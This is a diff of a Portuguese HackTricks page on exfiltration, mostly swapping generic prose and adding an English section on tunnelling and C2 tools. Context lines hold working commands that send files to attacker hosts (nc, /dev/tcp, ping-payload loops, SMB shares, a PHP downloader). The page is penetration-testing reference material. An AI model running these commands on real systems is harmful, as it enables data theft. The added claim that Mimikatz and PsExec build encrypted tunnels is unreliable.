@@ -6,7 +6,7 @@
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
@@ -16,7 +16,7 @@ Outras maneiras de apoiar o HackTricks:
 
 **Grupo de Segurança Try Hard**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -185,33 +185,23 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltração de Dados do Windows
+Windows
 
-## Introdução
+## Exfiltração
 
-Nesta seção, discutiremos várias técnicas comuns para exfiltrar dados de sistemas Windows comprometidos.
+### Ferramentas e Técnicas
 
-## Técnicas de Exfiltração
+Existem várias ferramentas e técnicas que podem ser usadas para exfiltrar dados de um sistema Windows comprometido. Algumas das técnicas comuns incluem:
 
-### Utilizando Protocolos de Rede
+- **Utilitários de linha de comando**: Utilização de utilitários como `bitsadmin`, `certutil`, `wmic`, `powershell`, entre outros, para transferir dados para um servidor remoto.
+- **Protocolos de rede**: Uso de protocolos como HTTP, HTTPS, DNS, SMB, entre outros, para enviar dados para fora da rede comprometida.
+- **Túneis criptografados**: Estabelecimento de túneis criptografados usando ferramentas como `Mimikatz` ou `PsExec` para enviar dados de forma segura.
+- **Steganography**: Ocultação de dados dentro de arquivos de imagem, áudio ou vídeo para evitar detecção.
+- **Uso de APIs do Windows**: Exploração de APIs do Windows para acessar e exfiltrar dados de forma programática.
 
-Uma maneira comum de exfiltrar dados é através do uso de protocolos de rede, como HTTP, DNS ou até mesmo ICMP. Os dados podem ser codificados e enviados para um servidor controlado pelo atacante.
+### Considerações Finais
 
-### Armazenamento em Nuvem
-
-O armazenamento em nuvem também pode ser uma forma eficaz de exfiltrar dados. Os arquivos podem ser enviados para contas de armazenamento em nuvem, como Dropbox ou Google Drive, e posteriormente baixados pelo atacante.
-
-### Uso de Túneis Criptografados
-
-Túneis criptografados, como VPNs ou proxies, podem ser utilizados para enviar dados de forma segura para servidores remotos controlados pelo atacante.
-
-### Esteganografia
-
-A esteganografia é uma técnica que envolve ocultar dados dentro de arquivos de mídia, como imagens ou vídeos, para exfiltrá-los sem chamar a atenção.
-
-## Conclusão
-
-Existem várias maneiras de exfiltrar dados de sistemas Windows comprometidos, e os atacantes geralmente utilizam uma combinação de técnicas para garantir o sucesso da operação. É crucial que os profissionais de segurança estejam cientes dessas técnicas para proteger adequadamente os sistemas contra tais ataques.
+É importante estar ciente das várias técnicas de exfiltração disponíveis em sistemas Windows para poder detectar e mitigar possíveis vazamentos de dados. O monitoramento contínuo do tráfego de rede, do uso de utilitários do sistema e da atividade do sistema pode ajudar a identificar atividades suspeitas e prevenir a perda não autorizada de dados.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -234,6 +224,25 @@ sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
+
+### Network Channels
+
+#### Description
+
+Network Channels (NC) are techniques used to exfiltrate data over network protocols. This can include common protocols such as HTTP, DNS, ICMP, or even custom protocols developed by an attacker. Network Channels are often used during post-exploitation phases to avoid detection by security controls that may be monitoring traditional channels.
+
+#### Resources
+
+- [**Chisel**](https://github.com/jpillora/chisel): A fast TCP tunnel over HTTP.
+- [**Dnscat2**](https://github.com/iagox86/dnscat2): A tool designed to create an encrypted command-and-control (C&C) channel over the DNS protocol.
+- [**Iodine**](https://code.kryo.se/iodine/): Tunnel IPv4 data through a DNS server.
+- [**C2Ch**](https://github.com/krmaxwell/c2ch): Command and control over HTTP.
+
+#### Considerations
+
+- Network Channels can be used to bypass network filtering rules that only allow specific protocols or ports.
+- Encrypted channels can help evade detection by security devices that are not able to inspect encrypted traffic.
+- Monitoring network traffic for anomalies can help detect the use of Network Channels for data exfiltration.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -252,14 +261,9 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-A seguir estão algumas técnicas comuns de exfiltração de dados usando o protocolo ICMP:
+Agradecimentos a **@BinaryShadow\_**
 
-- **Ping Tunneling**: Os dados são enviados em pacotes ICMP Echo Request e as respostas ICMP Echo Reply são usadas para recuperar os dados.
-- **Covert Channel**: Os dados são ocultados nos campos de cabeçalho ICMP para evitar detecção.
-- **ICMP Tunneling**: Os dados são encapsulados em pacotes ICMP para exfiltração.
-- **ICMP Time Exceeded Messages**: Os dados são ocultados nos campos de mensagens ICMP Time Exceeded para exfiltração.
-
-Essas técnicas podem ser eficazes para exfiltrar dados de redes restritas, pois o tráfego ICMP é frequentemente permitido em muitos ambientes.
+## **ICMP**
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -285,7 +289,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Por padrão no XP e 2003 (em outros sistemas, precisa ser adicionado explicitamente durante a instalação)
+Por padrão no XP e 2003 (em outros sistemas é necessário adicioná-lo explicitamente durante a instalação)
 
 No Kali, **inicie o servidor TFTP**:
 ```bash
@@ -310,28 +314,6 @@ Baixe um arquivo com um PHP oneliner:
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-### Overview
-
-VBScript is a scripting language that is commonly used for Windows systems. It can be used for various tasks, including exfiltration of data from a compromised system. VBScript can be executed using the `cscript.exe` or `wscript.exe` interpreters.
-
-### Exfiltration Techniques
-
-#### File Transfer
-
-VBScript can be used to read data from files on the compromised system and transfer it to an external server using protocols such as HTTP or FTP.
-
-#### Email
-
-VBScript can also be used to send emails with exfiltrated data as attachments or within the email body.
-
-#### DNS
-
-VBScript can leverage DNS requests to exfiltrate data by encoding it within subdomains or query strings.
-
-### Detection
-
-Detection of VBScript exfiltration techniques can be challenging due to its legitimate use in Windows environments. Monitoring for suspicious network traffic, file access patterns, and email activity can help in detecting potential exfiltration attempts.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -385,7 +367,7 @@ Em seguida, copie e cole o texto no windows-shell e um arquivo chamado nc.exe se
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
